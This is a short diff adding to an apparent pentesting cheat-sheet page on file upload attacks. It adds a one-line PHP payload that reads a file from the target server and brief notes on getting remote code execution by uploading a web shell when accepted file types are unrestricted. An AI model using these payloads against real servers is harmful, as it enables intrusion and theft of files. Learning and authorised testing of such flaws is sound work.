@@ -1,8 +1,21 @@
 # File Upload
 
+<details>
 
+<summary>Basic Payloads</summary>
 
+{% code lineNumbers="true" %}
+```php
+<?php echo file_get_contents('/path/to/target/file'); ?>
+```
+{% endcode %}
 
+</details>
+
+#### RCE via Web Shell
+
+* Upload payload file&#x20;
+* No restriction specified in accept-type header - all types (_/_) allowed
 
 
 
